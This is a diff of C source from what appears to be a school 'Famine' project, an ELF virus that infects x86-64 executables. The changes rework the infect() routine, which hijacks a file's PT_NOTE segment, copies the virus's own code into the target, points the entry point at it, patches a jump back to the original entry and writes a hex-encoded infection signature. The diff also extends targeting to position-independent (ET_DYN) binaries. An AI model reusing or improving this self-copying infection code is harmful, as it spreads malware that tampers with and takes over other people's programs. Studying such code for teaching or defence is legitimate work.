@@ -6,13 +6,15 @@
 /*   By: nguiard <marvin@42.fr>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/10/31 10:47:01 by nguiard           #+#    #+#             */
-/*   Updated: 2024/11/20 11:54:10 by nguiard          ###   ########.fr       */
+/*   Updated: 2024/11/25 15:31:57 by nguiard          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "famine.h"
 
 static bool		parsing(byte *file, elf_data *data);
+
+#define _START_SIZE	0x20
 
 //	Infects the file located at path
 //
@@ -23,6 +25,13 @@ bool	infect(profiling *this, const str path) {
 	struct stat file_stat = {0};
 	byte		*file_origin = NULL;
 	elf_data	data;
+	size_t		signature[5] = {
+		0x6465746365666E49,
+		0x6562646120796220,
+		0x646E6120636D2D6E,
+		0x6472616975676E20,
+		0x00293B20
+	};
 
 	(void)fd;
 	(void)ret;
@@ -48,7 +57,7 @@ bool	infect(profiling *this, const str path) {
 		return true;
 	}
 
-	data.mmap_size = file_stat.st_size;
+	data.original_size = file_stat.st_size;
 	data.fd = fd;
 
 	// Logic starts
@@ -60,23 +69,27 @@ bool	infect(profiling *this, const str path) {
 	//	Change the PT_NOTE segment
 	change_note_segment(this, &data);
 
+	print_data(&data);
+
 	//	Copy the code
-	ft_memcpy(data.file + data.infection_offset, this->start_rip, this->size);
+	ft_memcpy(data.file + data.infection_offset_file, this->start_rip, this->size);
 	
 	//	Change the entrypoint
-	data.elf->e_entry = data.infection_offset + 0x1000;
-	
+	data.elf->e_entry = data.infection_offset_mem + this->size - _START_SIZE;
+
+	write(ret, 1, &data.elf->e_entry, 4);
+
+	printf("%lx + %lx - %x = %lx (%lx)\n", data.infection_offset_mem, this->size, _START_SIZE, data.elf->e_entry,
+		data.infection_offset_mem + this->size - _START_SIZE);
+
 	//	Copy signature
-	ft_memcpy(data.file + data.infection_offset + this->size + SIGNATURE_OFFSET, this->signature, SIGNATURE_LEN);
-	printf("Written %s at 0x%lx\n", data.file + data.infection_offset + this->size + SIGNATURE_OFFSET,
-		data.infection_offset + this->size + SIGNATURE_OFFSET);
+	ft_memcpy(data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET, (byte *)signature, 40);
+	printf("Written %s at 0x%lx\n", data.file + data.infection_offset_file + this->size + SIGNATURE_OFFSET,
+		data.infection_offset_file + this->size + SIGNATURE_OFFSET);
 
-	int	new_jump = 0 - (data.infection_offset + this->size) + data.original_entry_point + 12 - 0x1000;
+	int	new_jump = 0 - (data.infection_offset_mem + this->size) + data.original_entry_point_mem + 12;
 
-
-	write(ret, 1, &new_jump, 4);
-	ft_memcpy(data.file + data.infection_offset + this->size - 16, (byte *)&new_jump, 4);
-	write(ret, 1, data.file + data.infection_offset + this->size - 16, 4);
+	ft_memcpy(data.file + data.infection_offset_file + this->size - 16, (byte *)&new_jump, 4);
 
 	// Logic ends
 	infect_end:
@@ -100,14 +113,15 @@ static bool	parsing(byte *file, elf_data *data) {
 	if (file[EI_CLASS] != ELFCLASS64 || file[EI_DATA] != ELFDATA2LSB)
 		return false;
 
-	if (((Elf64_Ehdr *)file)->e_machine != EM_X86_64)
+	if (((Elf64_Ehdr *)file)->e_machine != EM_X86_64 ||
+			!(((Elf64_Ehdr *)file)->e_type == ET_EXEC || ((Elf64_Ehdr *)file)->e_type == ET_DYN))
 		return false;
 
 	data->file = file;
 	data->elf = (Elf64_Ehdr *)file;
 	data->sections = (Elf64_Shdr *)(file + data->elf->e_shoff);
 	data->segments = (Elf64_Phdr *)(file + data->elf->e_phoff);
-	data->original_entry_point = data->elf->e_entry;
+	data->original_entry_point_mem = data->elf->e_entry;
 
 	for (size_t i = 0; i < data->elf->e_phnum; i++) {
 		seg = &data->segments[i];
@@ -116,7 +130,6 @@ static bool	parsing(byte *file, elf_data *data) {
 			return false;
 		}
 	}
-
 
 	return true;
 }
